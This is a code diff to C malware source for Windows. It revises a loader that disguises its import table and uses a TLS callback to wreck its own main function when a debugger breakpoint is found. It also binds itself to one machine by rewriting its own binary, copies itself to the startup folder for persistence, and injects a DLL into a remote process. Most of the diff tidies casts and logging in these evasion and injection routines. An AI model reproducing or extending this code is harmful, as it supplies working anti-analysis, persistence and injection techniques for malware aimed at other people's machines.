@@ -15,7 +15,7 @@
 
 //----------------------------------------------------------------------------------------------------------------
 #define ERROR_BUF_SIZE				(MAX_PATH * 2)
-//----------------------------------------------------------------------------------------------------------------
+
 #define PRINT( STR, ... )                                                                           \
     if (1) {                                                                                        \
         LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
@@ -42,7 +42,6 @@ void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
 
 //----------------------------------------------------------------------------------------------------------------
 // TLS Callback Function Prototypes:
-
 VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);
 
 #pragma const_seg(".CRT$XLB")
@@ -50,10 +49,6 @@ EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CAL
 #pragma const_seg()
 //----------------------------------------------------------------------------------------------------------------
 //----------------------------------------------------------------------------------------------------------------
- 
-#include <Winternl.h>
-
-// ========================================================================================================================================
 
 #define INITIAL_VALUE 0x4E554C4C
 
@@ -212,15 +207,12 @@ _END_OF_FUNC:
 
 // Function to Enable DRM
 BOOL IsSameMachine() {
-
-	BOOL					bResult = FALSE;
-	LPWSTR					szLocalImage = NULL;
-	ULONG_PTR				uModule = NULL,
-		                    uMachineSerialVA = NULL;
-	PIMAGE_NT_HEADERS		pImgNtHdrs = NULL;
-	PIMAGE_SECTION_HEADER	pImgSec = NULL;
-	DWORD					dwSerialNumber = 0x00,
-		                    dwFileSize = 0x00;
+	BOOL bResult = FALSE;
+	LPWSTR szLocalImage = NULL;
+	ULONG_PTR uModule = NULL, uMachineSerialVA = NULL;
+	PIMAGE_NT_HEADERS pImgNtHdrs = NULL;
+	PIMAGE_SECTION_HEADER pImgSec = NULL;
+	DWORD dwSerialNumber = 0x00, dwFileSize = 0x00;
 
 	// Get the volume serial number
 	if (!GetVolumeInformationW(L"C:\\", NULL, 0x00, &dwSerialNumber, NULL, NULL, NULL, 0x00) || dwSerialNumber == 0x00) {
@@ -253,20 +245,17 @@ BOOL IsSameMachine() {
 		goto _FUNC_CLEANUP;
 
 	// Fetch the Nt Headers
-	pImgNtHdrs = uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew;
+	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
 	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
 		goto _FUNC_CLEANUP;
 
 	// Fetch the value of the 'g_dwSerialNumberConstVariable' variable inside the .rdata section
 	pImgSec = IMAGE_FIRST_SECTION(pImgNtHdrs);
 	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections && !uMachineSerialVA; i++) {
-
 		// Check if the section name is '.rdata'
-		if (*(ULONG*)pImgSec[i].Name == 'adr.') {
-
+		if (strncmp((char*)pImgSec[i].Name, ".rdata", 6) == 0) {
 			// Search for the serial number
 			for (int x = 0; x < pImgSec[i].SizeOfRawData && !uMachineSerialVA; x += sizeof(DWORD)) {
-
 				// If the value is equal to the 'g_dwSerialNumberConstVariable'
 				if (*(DWORD*)(uModule + pImgSec[i].PointerToRawData + x) == g_dwSerialNumberConstVariable)
 					uMachineSerialVA = (uModule + pImgSec[i].PointerToRawData + x);
@@ -276,7 +265,6 @@ BOOL IsSameMachine() {
 
 	// If fetched
 	if (uMachineSerialVA != 0x00) {
-
 		// Patch it with the serial number
 		*(DWORD*)uMachineSerialVA = dwSerialNumber;
 
@@ -285,18 +273,18 @@ BOOL IsSameMachine() {
 			goto _FUNC_CLEANUP;
 
 		// Write the new version (patched)
-		if (!WriteSelfToDiskW(szLocalImage, uModule, dwFileSize))
+		if (!WriteSelfToDiskW(szLocalImage, (PVOID)uModule, dwFileSize))
 			goto _FUNC_CLEANUP;
 
 		bResult = TRUE;
 	}
 
-
 _FUNC_CLEANUP:
 	if (uModule != NULL)
-		HeapFree(GetProcessHeap(), 0x00, uModule);
+		HeapFree(GetProcessHeap(), 0x00, (LPVOID)uModule);
 	return bResult;
 }
+
 
 // Function to move the current running binary to the startup folder
 BOOL MoveToStartup() {
@@ -480,7 +468,6 @@ _EndOfFunction:
 }
 
 int main() {
-
 	// Camoflage the IAT
 	IATCamoflage2();
 
@@ -516,7 +503,7 @@ int main() {
 		return -1;
 	}
 
-	printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);
+	//printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);
 
 	// Inject the DLL into the remote process
 	if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
@@ -536,13 +523,16 @@ int main() {
 	// Close the handle to the process
 	CloseHandle(hProcess);
 
+	printf("[+] Done\n");
+
+
 	return 0;
 }
 
 // Anti-debugging TLS Callback Function
 VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {
 
-	DWORD		dwOldProtection = 0x00;
+	DWORD dwOldProtection = 0x00;
 
 	// Get the address of the main function
 	if (dwReason == DLL_PROCESS_ATTACH) {
@@ -553,16 +543,25 @@ VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {
 			PRINT("[TLS][!] Entry Point Is Patched With \"INT 3\" Instruction!\n");
 
 			// Overwrite main function - process crash
-			if (VirtualProtect(&main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+			if (VirtualProtect(main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+				PRINT("[TLS][+] VirtualProtect succeeded. Old protection: 0x%X\n", dwOldProtection);
 				memset(main, 0xFF, OVERWRITE_SIZE);
 				PRINT("[TLS][+] Main Function Is Overwritten With 0xFF Bytes \n");
-			}
 
-			// Restore the original protection
+				// Restore the original protection
+				if (VirtualProtect(main, OVERWRITE_SIZE, dwOldProtection, &dwOldProtection)) {
+					PRINT("[TLS][+] Restored the original protection: 0x%X\n", dwOldProtection);
+				}
+				else {
+					PRINT("[TLS][!] Failed to restore the original protection. Error: %d\n", GetLastError());
+				}
+			}
 			else {
-				PRINT("[TLS][!] Failed To Overwrite The Entry Point\n");
+				PRINT("[TLS][!] VirtualProtect failed. Error: %d\n", GetLastError());
 			}
-
+		}
+		else {
+			PRINT("[TLS][!] Entry Point Is Not Patched With \"INT 3\" Instruction. Current Opcode: 0x%X\n", *(BYTE*)main);
 		}
 	}
 }
